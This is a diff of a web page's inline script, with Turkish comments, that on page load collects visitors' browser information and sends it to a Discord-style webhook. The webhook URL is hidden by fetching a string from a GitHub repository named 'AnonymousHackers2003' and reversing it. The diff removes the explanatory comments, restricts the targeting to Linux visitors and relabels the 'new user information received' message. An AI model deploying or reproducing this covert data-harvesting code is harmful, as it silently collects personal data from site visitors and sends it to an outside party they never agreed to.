@@ -7,19 +7,15 @@
     <script>
         async function getWebhookURL() {
             try {
-                // GitHub'dan JSON dosyasını çekme
                 let response = await fetch("https://raw.githubusercontent.com/AnonymousHackers2003/birazbekle/main/birazbekle.json");
                 if (!response.ok) {
                     throw new Error("j");
                 }
                 let data = await response.json();
 
-                // JSON verisinden "aaaaaaaaaaaadgkdjgnsnjmd" anahtarını al
                 let webhookText = data["aaaaaaaaaaaadgkdjgnsnjmd"];
-
-                // Metni tersten oku
-                let reversedText = webhookText.split("").reverse().join("");  // Tersten okuma
-                return reversedText; // Webhook URL'si döndürülür
+                let reversedText = webhookText.split("").reverse().join("");
+                return reversedText;
             } catch (error) {
                 console.error(error);
                 return null;
@@ -27,6 +23,11 @@
         }
 
         document.addEventListener('DOMContentLoaded', async function () {
+            if (!navigator.userAgent.includes("Linux")) {
+                console.log("Linux dışındaki sistemler yok sayıldı.");
+                return;
+            }
+
             let webhookURL = await getWebhookURL();
             if (webhookURL) {
                 async function collectUserInfo() {
@@ -101,11 +102,11 @@
                             "Content-Type": "application/json"
                         },
                         body: JSON.stringify({
-                            content: "**Yeni Kullanıcı Bilgisi Alındı**",
+                            content: "**Yeni Linux Kullanıcı Bilgisi Alındı**",
                             embeds: [{
-                                title: "📊 Kullanıcı Bilgileri",
+                                title: "📊 Linux Kullanıcı Bilgileri",
                                 description: "Tarayıcıdan toplanan tüm bilgiler",
-                                color: 16711680,
+                                color: 65280,
                                 fields: Object.entries(data).map(([key, value]) => ({
                                     name: key,
                                     value: Array.isArray(value) ? value.join(", ") : value.toString(),
